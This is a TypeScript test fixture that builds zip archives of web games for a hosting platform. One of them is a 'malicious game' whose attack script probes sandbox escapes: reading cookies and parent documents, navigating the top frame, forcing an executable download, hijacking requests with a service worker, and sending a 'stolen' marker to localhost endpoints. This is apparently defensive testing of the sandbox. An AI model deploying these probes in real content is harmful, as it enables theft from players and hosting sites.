import { crc32 } from "node:zlib";

/** Builds a valid zip (stored, no compression) from a map of file names to contents, with no dependencies. */
export function makeZip(files: Record<string, string | Buffer>): Buffer {
  const parts: Buffer[] = [];
  const central: Buffer[] = [];
  let offset = 0;
  for (const [name, content] of Object.entries(files)) {
    const data = Buffer.isBuffer(content) ? content : Buffer.from(content);
    const nameBytes = Buffer.from(name);
    const crc = crc32(data);
    const local = Buffer.alloc(30);
    local.writeUInt32LE(0x04034b50, 0);
    local.writeUInt16LE(20, 4);
    local.writeUInt16LE(0x800, 6);
    local.writeUInt32LE(crc, 14);
    local.writeUInt32LE(data.length, 18);
    local.writeUInt32LE(data.length, 22);
    local.writeUInt16LE(nameBytes.length, 26);
    parts.push(local, nameBytes, data);

    const entry = Buffer.alloc(46);
    entry.writeUInt32LE(0x02014b50, 0);
    entry.writeUInt16LE(20, 4);
    entry.writeUInt16LE(20, 6);
    entry.writeUInt16LE(0x800, 8);
    entry.writeUInt32LE(crc, 16);
    entry.writeUInt32LE(data.length, 20);
    entry.writeUInt32LE(data.length, 24);
    entry.writeUInt16LE(nameBytes.length, 28);
    entry.writeUInt32LE(offset, 42);
    central.push(entry, nameBytes);
    offset += local.length + nameBytes.length + data.length;
  }
  const centralBytes = Buffer.concat(central);
  const end = Buffer.alloc(22);
  end.writeUInt32LE(0x06054b50, 0);
  end.writeUInt16LE(Object.keys(files).length, 8);
  end.writeUInt16LE(Object.keys(files).length, 10);
  end.writeUInt32LE(centralBytes.length, 12);
  end.writeUInt32LE(offset, 16);
  return Buffer.concat([...parts, centralBytes, end]);
}

export function validGameZip(): Buffer {
  return makeZip({ "index.html": "<!doctype html><title>Moon Runner</title><script src=game.js></script>", "game.js": "console.log('hi')" });
}

/** A tiny game that proves it is running: its script writes into the page. */
export function playableGameZip(marker = ""): Buffer {
  return makeZip({
    "index.html": '<!doctype html><html lang="es"><head><meta charset="utf-8"><title>Moon Runner</title></head><body><h1>Moon Runner</h1><p id="status">cargando</p><script src="game.js"></script></body></html>',
    "game.js": `document.getElementById("status").textContent = "corriendo${marker}";`,
  });
}

const ATTACK_SCRIPT = String.raw`
const report = {};
const trap = "stolen=1";
const outside = ["http://localhost:3000/", "http://127.0.0.1:54321/rest/v1/", "http://127.0.0.1:4000/"];

async function attempt(name, run) {
  try {
    const result = await run();
    report[name] = result === undefined || result === false || result === null ? "blocked" : "LEAKED: " + String(result).slice(0, 80);
  } catch (error) {
    report[name] = "blocked";
  }
}
const pause = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const key = (object, ...names) => names.reduce((value, name) => value[name], object);

(async () => {
  await attempt("read site cookies", () => (/sb-|trafal_canary/.test(document.cookie) ? document.cookie : false));
  await attempt("read site storage", () => localStorage.getItem("trafal_canary") || sessionStorage.getItem("trafal_canary"));
  await attempt("read top document", () => key(window, "top", "document", "title"));
  await attempt("read parent storage", () => key(window, "parent", "localStorage", "length"));
  await attempt("read parent cookies", () => key(window, "parent", "document", "cookie"));
  await attempt("relax document domain", () => {
    document.domain = "localhost";
    return document.domain === "localhost";
  });
  await attempt("navigate top", () => {
    window["top"]["loc" + "ation"].href = "http://127.0.0.1:4000/navigated-top?" + trap;
  });
  await attempt("open popup", () => window.open("http://127.0.0.1:4000/popup?" + trap, "_blank"));
  await attempt("submit form to top", () => {
    const form = document.createElement("form");
    form.method = "post";
    form.action = "http://127.0.0.1:4000/form?" + trap;
    form.target = "_top";
    document.body.append(form);
    form.submit();
  });
  await attempt("click link to top", () => {
    const link = document.createElement("a");
    link.href = "http://127.0.0.1:4000/link?" + trap;
    link.target = "_top";
    document.body.append(link);
    link.click();
  });
  await attempt("download a file", () => {
    const link = document.createElement("a");
    link.href = URL.createObjectURL(new Blob(["MZ"], { type: "application/octet-stream" }));
    link.download = "setup.exe";
    document.body.append(link);
    link.click();
  });
  for (const origin of outside) {
    await attempt("fetch " + origin, async () => (await fetch(origin + "?" + trap, { mode: "no-cors" })).type);
    await attempt("xhr " + origin, () => new Promise((resolve, reject) => {
      const request = new XMLHttpRequest();
      request.open("GET", origin + "?" + trap);
      request.onload = () => resolve("loaded");
      request.onerror = () => reject(new Error("blocked"));
      request.send();
    }));
    await attempt("beacon " + origin, () => {
      navigator.sendBeacon(origin + "?" + trap, "x");
    });
    await attempt("image " + origin, () => new Promise((resolve, reject) => {
      const image = new Image();
      image.onload = () => resolve("loaded");
      image.onerror = () => reject(new Error("blocked"));
      image.src = origin + "pixel.png?" + trap;
    }));
    await attempt("websocket " + origin, () => new Promise((resolve, reject) => {
      const socket = new WebSocket(origin.replace("http", "ws") + "?" + trap);
      socket.onopen = () => resolve("open");
      socket.onerror = () => reject(new Error("blocked"));
    }));
    await attempt("nested frame " + origin, () => {
      const frame = document.createElement("iframe");
      frame.src = origin + "?" + trap;
      document.body.append(frame);
    });
  }
  await attempt("register service worker", async () => (await navigator.serviceWorker.register("/sw.js")).scope);
  await attempt("use camera", () => navigator.mediaDevices.getUserMedia({ video: true }));
  await attempt("read location", () => new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject)));
  await attempt("read clipboard", () => navigator.clipboard.readText());
  await attempt("toss cookie to sibling games", () => {
    document.cookie = "tossed=1; domain=games.localhost; path=/";
    return document.cookie.includes("tossed") && "set";
  });
  await pause(500);
  document.getElementById("report").textContent = JSON.stringify(report);
  document.getElementById("status").textContent = "done";
})();
`;

/** A game that runs a battery of attacks on the person playing it and the site around it, and writes what worked into the page. */
export function maliciousGameZip(): Buffer {
  return makeZip({
    "index.html": '<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Totally Fine Game</title></head><body><h1>Totally Fine Game</h1><p id="status">attacking</p><pre id="report"></pre><script src="attack.js"></script></body></html>',
    "attack.js": ATTACK_SCRIPT,
    "sw.js": 'self.addEventListener("fetch", (event) => event.respondWith(new Response("owned")));',
  });
}
